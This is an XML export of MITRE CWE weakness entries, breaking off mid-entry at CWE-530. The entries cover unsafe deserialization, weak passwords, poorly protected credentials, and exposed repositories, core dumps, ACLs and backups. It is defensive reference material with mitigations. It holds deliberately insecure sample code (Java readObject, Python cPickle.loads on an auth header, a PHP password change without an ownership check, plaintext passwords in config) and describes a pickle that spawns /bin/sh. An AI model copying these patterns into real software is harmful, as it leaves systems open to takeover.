<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-6" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="VIEW LIST: CWE-1008: Architectural Concepts" Version="3.3" Date="2019-06-20" xsi:schemaLocation="http://cwe.mitre.org/cwe-6 http://cwe.mitre.org/data/xsd/cwe_schema_v6.1.xsd">
   <Weaknesses>
      
      <Weakness ID="502" Name="Deserialization of Untrusted Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid.</Description>
         <Extended_Description>
            <xhtml:p>It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.</xhtml:p>
            <xhtml:p>Data that is untrusted can not be trusted to be well-formed.</xhtml:p>
            <xhtml:p>When developers place no restrictions on "gadget chains," or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="915" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="Ruby" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Python" Prevalence="Undetermined"/>
            <Language Name="JavaScript" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred ("serialization"), then extracting the serialized data to reconstruct the original object ("deserialization").</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Marshaling, Unmarshaling</Term>
               <Description>Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Pickling, Unpickling</Term>
               <Description>In Python, the "pickle" functionality is used to perform serialization and deserialization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Unexpected State</Impact>
               <Note>Attackers can modify unexpected objects or data that was assumed to be safe from modification.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Note>If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Note>The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Explicitly define a final object() to prevent deserialization.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Make fields transient to protect them from deserialization.</xhtml:p>
                  <xhtml:p>An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Whitelist acceptable classes. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code snippet deserializes an object from a file and uses it as a UI button:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">File file = new File("object.obj");<xhtml:br/>ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));<xhtml:br/>javax.swing.JButton button = (javax.swing.JButton) in.readObject();<xhtml:br/>in.close();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed.</Body_Text>
               <Body_Text>To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:</Body_Text>
               <Example_Code Nature="good" Language="Java">
                  <xhtml:div>private final void readObject(ObjectInputStream in) throws java.io.IOException {<xhtml:br/>throw new java.io.IOException("Cannot be deserialized"); }</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [R.502.7], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.</Intro_Text>
               <Example_Code Nature="bad" Language="Python">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>class ExampleProtocol(protocol.Protocol):<xhtml:br/>def dataReceived(self, data):<xhtml:br/>
                           <xhtml:br/># Code that would be here would parse the incoming data<xhtml:br/># After receiving headers, call confirmAuth() to authenticate<xhtml:br/>
                           <xhtml:br/>def confirmAuth(self, headers):<xhtml:br/>try:<xhtml:br/>token = cPickle.loads(base64.b64decode(headers['AuthToken']))<xhtml:br/>if not check_hmac(token['signature'], token['data'], getSecretKey()):<xhtml:br/>raise AuthFail<xhtml:br/>self.secure_data = token['data']<xhtml:br/>except:<xhtml:br/>raise AuthFail</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object "AuthToken" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2015-8103</Reference>
               <Description>Deserialization issue in commonly-used Java library allows remote execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8103</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-4852</Reference>
               <Description>Deserialization issue in commonly-used Java library allows remote execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-1465</Reference>
               <Description>Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1465</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3527</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system might allow code execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-2520</Reference>
               <Description>Python script allows local users to execute code via pickled data.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-4406</Reference>
               <Description>Unsafe deserialization using pickle in a Python script.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4406</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0791</Reference>
               <Description>Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0791</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Deserialization of untrusted data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER01-J</Entry_ID>
               <Entry_Name>Do not deviate from the proper signatures of serialization methods</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER03-J</Entry_ID>
               <Entry_Name>Do not serialize unencrypted, sensitive data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER06-J</Entry_ID>
               <Entry_Name>Make defensive copies of private mutable components during deserialization</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER08-J</Entry_ID>
               <Entry_Name>Do not use the default serialized form for implementation defined invariants</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="586"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-461"/>
            <Reference External_Reference_ID="REF-462"/>
            <Reference External_Reference_ID="REF-463"/>
            <Reference External_Reference_ID="REF-464"/>
            <Reference External_Reference_ID="REF-465"/>
            <Reference External_Reference_ID="REF-466"/>
            <Reference External_Reference_ID="REF-467"/>
            <Reference External_Reference_ID="REF-468"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="521" Name="Weak Password Requirements" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.</Description>
         <Extended_Description>An authentication mechanism is only as strong as its credentials. For this reason, it is important to require users to have strong passwords. Lack of password complexity significantly reduces the search space when trying to guess user's passwords, making brute-force attacks easier.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could easily guess user passwords and gain access user accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Enforce usage of strong passwords. A password strength policy should contain the following attributes:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ol>
                        <xhtml:li>Minimum and maximum length;</xhtml:li>
                        <xhtml:li>Require mixed character sets (alpha, numeric, special, mixed case);</xhtml:li>
                        <xhtml:li>Do not contain user name;</xhtml:li>
                        <xhtml:li>Expiration;</xhtml:li>
                        <xhtml:li>No password reuse.</xhtml:li>
                     </xhtml:ol>
                  </xhtml:div>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Authentication mechanisms should always require sufficiently complex passwords and require that they be periodically changed.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="112"/>
            <Related_Attack_Pattern CAPEC_ID="16"/>
            <Related_Attack_Pattern CAPEC_ID="49"/>
            <Related_Attack_Pattern CAPEC_ID="55"/>
            <Related_Attack_Pattern CAPEC_ID="70"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         
      </Weakness>
      <Weakness ID="522" Name="Insufficiently Protected Credentials" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>This weakness occurs when the application transmits or stores authentication credentials and uses an insecure method that is susceptible to unauthorized interception and/or retrieval.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain access to user accounts and access sensitive data used by the user accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an appropriate security mechanism to protect the credentials.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make appropriate use of cryptography to protect the credentials.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-56">
               <Intro_Text>This code changes a user's password.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:10px;">SetUserPassword($user, $pass);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-57">
               <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>Properties prop = new Properties();<xhtml:br/>prop.load(new FileInputStream("config.properties"));<xhtml:br/>String password = prop.getProperty("password");<xhtml:br/>DriverManager.getConnection(url, usr, password);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-58">
               <Intro_Text>The following code reads a password from the registry and uses the password to create a new network credential.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String password = regKey.GetValue(passKey).toString();<xhtml:br/>NetworkCredential netCred = new NetworkCredential(username,password,domain);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-59">
               <Intro_Text>Both of these examples verify a password by comparing it to a stored compressed version.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:10px;">if (strcmp(compress(password), compressed_password)) {<xhtml:div style="margin-left:10px;">printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:10px;">if (passwd.Equals(compress(password), compressed_password)) {<xhtml:div style="margin-left:10px;">return(0);</xhtml:div>}<xhtml:br/>
                        <xhtml:i>//Diagnostic Mode</xhtml:i>
                        <xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a plaintext username / password pair.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:10px;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0681</Reference>
               <Description>Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0944</Reference>
               <Description>Web application password change utility doesn't check the original password.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0944</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="474"/>
            <Related_Attack_Pattern CAPEC_ID="50"/>
            <Related_Attack_Pattern CAPEC_ID="551"/>
            <Related_Attack_Pattern CAPEC_ID="555"/>
            <Related_Attack_Pattern CAPEC_ID="560"/>
            <Related_Attack_Pattern CAPEC_ID="561"/>
            <Related_Attack_Pattern CAPEC_ID="644"/>
            <Related_Attack_Pattern CAPEC_ID="645"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         
      </Weakness>
      <Weakness ID="523" Name="Unprotected Transport of Credentials" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Login pages not using adequate measures to protect the user name and password while they are in transit from the client to the server.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="312" View_ID="1000"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="527" Name="Exposure of CVS Repository to an Unauthorized Control Sphere" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product stores a CVS repository in a directory or other container that is accessible to actors outside of the intended control sphere.</Description>
         <Extended_Description>Information contained within a CVS subdirectory on a web server or other server could be recovered by an attacker and used for malicious purposes. This information may include usernames, filenames, path root, and IP addresses.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="699"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>Distribution</Phase>
               <Phase>System Configuration</Phase>
               <Description>Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed.</Description>
            </Mitigation>
         </Potential_Mitigations>
         
      </Weakness>
      <Weakness ID="528" Name="Exposure of Core Dump File to an Unauthorized Control Sphere" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product generates a core dump file in a directory that is accessible to actors outside of the intended control sphere.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="699"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Protect the core dump files from unauthorized access.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM06-C</Entry_ID>
               <Entry_Name>Ensure that sensitive data is not written out to disk</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="529" Name="Exposure of Access Control List Files to an Unauthorized Control Sphere" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.</Description>
         <Extended_Description>Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="699"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Protect access control list files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         
      </Weakness>
      <Weakness ID="530" Name="Exposure of Backup File to an Unauthorized Control Sphere" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>A backup file is stored in a directory that is accessible to actors outside of the intended control sphere.</Description>
         <Extended_Description>Often, old files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
